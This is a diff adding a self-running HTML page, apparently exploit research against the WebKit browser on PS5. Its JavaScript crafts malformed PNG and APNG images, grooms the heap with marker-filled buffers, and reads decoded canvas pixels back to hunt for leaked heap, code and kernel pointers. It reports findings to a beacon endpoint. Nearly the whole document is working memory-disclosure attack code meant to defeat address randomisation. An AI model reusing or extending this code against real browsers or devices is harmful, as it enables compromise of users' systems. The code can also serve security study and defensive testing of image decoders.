@@ -1,0 +1,518 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1105</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+function hex8(v){var s=v.toString(16);while(s.length<8)s='0'+s;return'0x'+s;}
+
+B('P1105-BOOT','');
+log('phase','=== P1105: APNG DECODER-LEVEL OVERREAD ===');
+log('info','Goal: Craft malformed APNGs to leak uninitialized heap data');
+log('info','V674b tested conforming truncation only — this tests decoder bugs');
+
+// =============================================
+// PNG/APNG binary builder helpers
+// =============================================
+function crc32(buf){
+  var t=new Int32Array(256);
+  for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c;}
+  var crc=0xFFFFFFFF;
+  for(var i=0;i<buf.length;i++)crc=t[(crc^buf[i])&0xFF]^(crc>>>8);
+  return(crc^0xFFFFFFFF)>>>0;
+}
+
+function u32be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF];}
+
+function pngChunk(type,data){
+  var tBytes=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];
+  var crcBuf=new Uint8Array(4+data.length);
+  crcBuf.set(tBytes,0);crcBuf.set(data,4);
+  var crc=crc32(crcBuf);
+  var out=[];
+  out.push.apply(out,u32be(data.length));
+  out.push.apply(out,tBytes);
+  for(var i=0;i<data.length;i++)out.push(data[i]);
+  out.push.apply(out,u32be(crc));
+  return out;
+}
+
+function pngChunkBadCRC(type,data){
+  var tBytes=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];
+  var out=[];
+  out.push.apply(out,u32be(data.length));
+  out.push.apply(out,tBytes);
+  for(var i=0;i<data.length;i++)out.push(data[i]);
+  out.push.apply(out,u32be(0xDEADBEEF)); // bad CRC
+  return out;
+}
+
+function pngSig(){return[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A];}
+
+function makeIHDR(w,h,depth,colorType){
+  var d=[];
+  d.push.apply(d,u32be(w));
+  d.push.apply(d,u32be(h));
+  d.push(depth);       // bit depth
+  d.push(colorType);   // 2=RGB, 6=RGBA
+  d.push(0);           // compression
+  d.push(0);           // filter
+  d.push(0);           // interlace
+  return pngChunk('IHDR',d);
+}
+
+// acTL for APNG (num_frames, num_plays)
+function makeACTL(frames,plays){
+  var d=[];
+  d.push.apply(d,u32be(frames));
+  d.push.apply(d,u32be(plays));
+  return pngChunk('acTL',d);
+}
+
+// fcTL frame control
+function makeFCTL(seq,w,h,xoff,yoff,delayNum,delayDen,dispose,blend){
+  var d=[];
+  d.push.apply(d,u32be(seq));
+  d.push.apply(d,u32be(w));
+  d.push.apply(d,u32be(h));
+  d.push.apply(d,u32be(xoff));
+  d.push.apply(d,u32be(yoff));
+  d.push((delayNum>>>8)&0xFF,delayNum&0xFF);
+  d.push((delayDen>>>8)&0xFF,delayDen&0xFF);
+  d.push(dispose); // 0=none,1=background,2=previous
+  d.push(blend);   // 0=source,1=over
+  return pngChunk('fcTL',d);
+}
+
+// Minimal DEFLATE: stored block (no compression)
+function deflateStored(raw){
+  var out=[];
+  var off=0;
+  while(off<raw.length){
+    var remain=raw.length-off;
+    var blen=Math.min(remain,65535);
+    var last=(off+blen>=raw.length)?1:0;
+    out.push(last);  // BFINAL
+    out.push(blen&0xFF,(blen>>>8)&0xFF);
+    out.push((~blen)&0xFF,((~blen)>>>8)&0xFF);
+    for(var i=0;i<blen;i++)out.push(raw[off+i]);
+    off+=blen;
+  }
+  // Adler32
+  var a=1,b=0;
+  for(var i=0;i<raw.length;i++){a=(a+raw[i])%65521;b=(b+a)%65521;}
+  var adler=(b<<16)|a;
+  // zlib wrapper: CMF=0x78, FLG=0x01
+  var zlib=[0x78,0x01];
+  zlib.push.apply(zlib,out);
+  zlib.push.apply(zlib,u32be(adler));
+  return zlib;
+}
+
+// Build scanlines for solid color (filter=0 + RGBA pixels)
+function solidScanlines(w,h,r,g,b,a){
+  var raw=[];
+  for(var y=0;y<h;y++){
+    raw.push(0); // filter byte = None
+    for(var x=0;x<w;x++){raw.push(r,g,b,a);}
+  }
+  return raw;
+}
+
+// =============================================
+// TEST A: Truncated IDAT mid-row
+// Decoder gets partial scanline data; remaining pixels
+// should be zero but might contain stale heap data
+// =============================================
+function testA(cb){
+  log('phase','--- TEST A: Truncated IDAT mid-row ---');
+  var W=64, H=64; // 64x64 RGBA = 16KB decoded
+  var scanlines=solidScanlines(W,H,0x41,0x41,0x41,0xFF);
+  var fullZlib=deflateStored(scanlines);
+  // Truncate at 50% of the zlib data (mid-row)
+  var truncLen=Math.floor(fullZlib.length*0.5);
+  var truncZlib=fullZlib.slice(0,truncLen);
+
+  var png=[];
+  png.push.apply(png,pngSig());
+  png.push.apply(png,makeIHDR(W,H,8,6));
+  // Use declared length = truncLen but actual IDAT data = truncLen
+  png.push.apply(png,pngChunk('IDAT',truncZlib));
+  // NO IEND — test missing trailer too
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,W,H);
+    analyzePixels('A',id.data,W,H);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-A','err=load_failed');log('fail','A: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// TEST B: Short DEFLATE — zlib says N bytes but
+// DEFLATE stream ends early, leaving gap
+// =============================================
+function testB(cb){
+  log('phase','--- TEST B: Short DEFLATE stream ---');
+  var W=64, H=64;
+  // Only encode first 4 rows worth of data
+  var partialScanlines=solidScanlines(W,4,0x42,0x42,0x42,0xFF);
+  var zlib=deflateStored(partialScanlines);
+
+  var png=[];
+  png.push.apply(png,pngSig());
+  png.push.apply(png,makeIHDR(W,H,8,6));
+  png.push.apply(png,pngChunk('IDAT',zlib));
+  png.push.apply(png,pngChunk('IEND',[]));
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,W,H);
+    analyzePixels('B',id.data,W,H);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-B','err=load_failed');log('fail','B: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// TEST C: APNG dispose=previous with no previous frame
+// Frame 2 should restore "previous" but there IS no previous
+// — decoder might leave uninitialized buffer
+// =============================================
+function testC(cb){
+  log('phase','--- TEST C: APNG dispose=previous (no previous) ---');
+  var W=64, H=64;
+  var scan1=solidScanlines(W,H,0x43,0x43,0x43,0xFF);
+  var zlib1=deflateStored(scan1);
+  // Frame 2: small 4x4 at offset 0,0
+  var scan2=solidScanlines(4,4,0xFF,0x00,0x00,0xFF);
+  var zlib2=deflateStored(scan2);
+
+  var png=[];
+  var seq=0;
+  png.push.apply(png,pngSig());
+  png.push.apply(png,makeIHDR(W,H,8,6));
+  png.push.apply(png,makeACTL(2,0));
+  // Frame 1: dispose=previous(2) — but there's nothing to restore TO
+  png.push.apply(png,makeFCTL(seq++,W,H,0,0,100,1000,2,0));
+  png.push.apply(png,pngChunk('IDAT',zlib1));
+  // Frame 2: 4x4, dispose=none, blend=source
+  png.push.apply(png,makeFCTL(seq++,4,4,0,0,100,1000,0,0));
+  // fdAT: seq + data
+  var fdat2=u32be(seq++);
+  for(var i=0;i<zlib2.length;i++)fdat2.push(zlib2[i]);
+  png.push.apply(png,pngChunk('fdAT',fdat2));
+  png.push.apply(png,pngChunk('IEND',[]));
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,W,H);
+    analyzePixels('C',id.data,W,H);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-C','err=load_failed');log('fail','C: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// TEST D: Bad CRC on IDAT — decoder might skip
+// CRC validation and use partial/corrupt data
+// =============================================
+function testD(cb){
+  log('phase','--- TEST D: IDAT with bad CRC ---');
+  var W=64, H=64;
+  var scan=solidScanlines(W,H,0x44,0x44,0x44,0xFF);
+  var zlib=deflateStored(scan);
+
+  var png=[];
+  png.push.apply(png,pngSig());
+  png.push.apply(png,makeIHDR(W,H,8,6));
+  png.push.apply(png,pngChunkBadCRC('IDAT',zlib));
+  png.push.apply(png,pngChunk('IEND',[]));
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,W,H);
+    analyzePixels('D',id.data,W,H);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-D','err=load_failed');log('fail','D: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// TEST E: APNG with interlaced frame (Adam7)
+// Interlaced decoding uses a different buffer
+// fill pattern — gaps between passes might leak
+// =============================================
+function testE(cb){
+  log('phase','--- TEST E: Interlaced PNG (Adam7) ---');
+  var W=64, H=64;
+  // For interlaced, we need proper Adam7 pass data
+  // But we'll intentionally provide only pass 1 data
+  // (1/8 of pixels) and see what happens to the rest
+  var scan=solidScanlines(W,H,0x45,0x45,0x45,0xFF);
+  var zlib=deflateStored(scan);
+  // Truncate to ~12.5% (pass 1 only)
+  var truncLen=Math.floor(zlib.length/8)+20; // rough
+  var truncZlib=zlib.slice(0,truncLen);
+
+  var ihdrData=[];
+  ihdrData.push.apply(ihdrData,u32be(W));
+  ihdrData.push.apply(ihdrData,u32be(H));
+  ihdrData.push(8);  // depth
+  ihdrData.push(6);  // RGBA
+  ihdrData.push(0);  // compression
+  ihdrData.push(0);  // filter
+  ihdrData.push(1);  // interlace=Adam7
+
+  var png=[];
+  png.push.apply(png,pngSig());
+  png.push.apply(png,pngChunk('IHDR',ihdrData));
+  png.push.apply(png,pngChunk('IDAT',truncZlib));
+  png.push.apply(png,pngChunk('IEND',[]));
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,W,H);
+    analyzePixels('E',id.data,W,H);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-E','err=load_failed');log('fail','E: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// TEST F: Large canvas with tiny APNG
+// 1024x1024 canvas, 4x4 APNG
+// Uninitialized canvas pixels might leak
+// =============================================
+function testF(cb){
+  log('phase','--- TEST F: Large canvas + tiny APNG ---');
+  var IW=4,IH=4,CW=1024,CH=1024;
+  var scan=solidScanlines(IW,IH,0x46,0x46,0x46,0xFF);
+  var zlib=deflateStored(scan);
+
+  var png=[];
+  png.push.apply(png,pngSig());
+  png.push.apply(png,makeIHDR(IW,IH,8,6));
+  png.push.apply(png,pngChunk('IDAT',zlib));
+  png.push.apply(png,pngChunk('IEND',[]));
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=CW;c.height=CH;
+    var ctx=c.getContext('2d');
+    // Don't clear canvas — draw tiny image into corner
+    ctx.drawImage(img,0,0);
+    // Read the ENTIRE canvas including undrawn area
+    var id=ctx.getImageData(0,0,CW,CH);
+    // Only analyze the undrawn region (skip first 4 rows, 4 cols)
+    var undrawnData=new Uint8Array(id.data.buffer);
+    analyzePixels('F',undrawnData,CW,CH);
+    // Also check specifically the gap region
+    var gapPtrs=0,gapNonZero=0;
+    for(var y=IH;y<CH;y++){
+      for(var x=0;x<CW;x++){
+        var off=(y*CW+x)*4;
+        var r=undrawnData[off],g=undrawnData[off+1],b=undrawnData[off+2],a=undrawnData[off+3];
+        if(r||g||b||a)gapNonZero++;
+      }
+    }
+    B('P1105-F-GAP','gapNZ='+gapNonZero+'|gapTotal='+((CH-IH)*CW));
+    log('info','F gap: '+gapNonZero+' non-zero pixels in undrawn region');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-F','err=load_failed');log('fail','F: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// TEST G: Heap grooming + APNG decode
+// Spray heap with recognizable patterns,
+// free them, then decode APNG hoping freed
+// heap chunks bleed into decoder buffer
+// =============================================
+function testG(cb){
+  log('phase','--- TEST G: Heap groom + APNG decode ---');
+  var W=256, H=256; // Large decode buffer = 256KB
+  // Groom: create+release many 256KB ArrayBuffers with markers
+  var groom=[];
+  for(var i=0;i<32;i++){
+    var ab=new ArrayBuffer(W*H*4);
+    var u=new Uint32Array(ab);
+    // Fill with recognizable pattern: 0xBEEF0000 | index
+    for(var j=0;j<u.length;j++)u[j]=0xBEEF0000|(i&0xFFFF);
+    groom.push(ab);
+  }
+  // Release them — bmalloc might reuse this memory for decoder buffer
+  groom=null;
+
+  // Now decode a truncated APNG — decoder allocates buffer in freed heap
+  var scan=solidScanlines(W,2,0x47,0x47,0x47,0xFF); // Only 2 rows
+  var zlib=deflateStored(scan);
+
+  var png=[];
+  png.push.apply(png,pngSig());
+  png.push.apply(png,makeIHDR(W,H,8,6)); // Claim 256x256
+  png.push.apply(png,pngChunk('IDAT',zlib)); // But only 2 rows of data
+  png.push.apply(png,pngChunk('IEND',[]));
+
+  var blob=new Blob([new Uint8Array(png)],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    var c=document.createElement('canvas');c.width=W;c.height=H;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,W,H);
+    analyzePixels('G',id.data,W,H);
+    // Check specifically for our groom pattern
+    var u32=new Uint32Array(id.data.buffer);
+    var beefCount=0;
+    for(var i=0;i<u32.length;i++){
+      if((u32[i]&0xFFFF0000)===0xBEEF0000)beefCount++;
+    }
+    B('P1105-G-BEEF','beefHits='+beefCount+'|total='+u32.length);
+    log(beefCount>0?'win':'info','G groom markers found: '+beefCount+'/'+u32.length);
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.onerror=function(){
+    B('P1105-G','err=load_failed');log('fail','G: Image load failed');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src=url;
+}
+
+// =============================================
+// Pixel analysis — look for pointer-shaped values
+// =============================================
+function analyzePixels(tag,data,w,h){
+  var total=data.length;
+  var nonZero=0,distinctBytes={},ptrLike=0;
+  var sample=[];
+
+  // Byte-level analysis
+  for(var i=0;i<total;i++){
+    if(data[i]!==0)nonZero++;
+    distinctBytes[data[i]]=1;
+  }
+  var distinctCount=Object.keys(distinctBytes).length;
+
+  // Qword-level: look for pointer-shaped values
+  // heap pointers on PS5: 0x000002xxxxxxxxxx range
+  // WebKit code: 0x000001xxxxxxxxxx range
+  var u32=new Uint32Array(data.buffer,data.byteOffset,Math.floor(data.byteLength/4));
+  var heapPtrs=0,codePtrs=0,kernPtrs=0,highU32=0;
+  for(var i=0;i<u32.length-1;i+=2){
+    var lo=u32[i],hi=u32[i+1];
+    if(hi===0)continue;
+    if(hi>=0xFFFF8000)kernPtrs++;
+    else if((hi&0xFFFF00)===0x000200)heapPtrs++;
+    else if((hi&0xFFFF00)===0x000100)codePtrs++;
+    if(hi>0xFF)highU32++;
+  }
+
+  // First 32 non-zero bytes for diagnostic
+  var nonZeroBytes=[];
+  for(var i=0;i<total&&nonZeroBytes.length<32;i++){
+    if(data[i]!==0)nonZeroBytes.push(hex(data[i]));
+  }
+
+  var summary='nz='+nonZero+'/'+total+'|dist='+distinctCount+'|heap='+heapPtrs+'|code='+codePtrs+'|kern='+kernPtrs+'|hi32='+highU32;
+  B('P1105-'+tag,summary);
+  log(heapPtrs>0||codePtrs>0?'win':'info',tag+': '+summary);
+  if(nonZeroBytes.length>0)log('info',tag+' sample: '+nonZeroBytes.join(' '));
+
+  if(heapPtrs>0)log('win','!!! HEAP POINTERS FOUND: '+heapPtrs+' !!!');
+  if(codePtrs>0)log('win','!!! CODE POINTERS FOUND: '+codePtrs+' !!!');
+  if(kernPtrs>0)log('win','!!! KERNEL POINTERS FOUND: '+kernPtrs+' !!!');
+}
+
+// =============================================
+// Run all tests sequentially
+// =============================================
+var tests=[testA,testB,testC,testD,testE,testF,testG];
+var idx=0;
+function runNext(){
+  if(idx>=tests.length){
+    B('P1105-DONE','all='+tests.length);
+    log('phase','=== ALL TESTS COMPLETE ===');
+    return;
+  }
+  try{
+    tests[idx](function(){idx++;setTimeout(runNext,100);});
+  }catch(e){
+    B('P1105-ERR'+idx,e.message);
+    log('fail','Test '+idx+' threw: '+e.message);
+    idx++;setTimeout(runNext,100);
+  }
+}
+setTimeout(runNext,50);
+</script>
+</body></html>
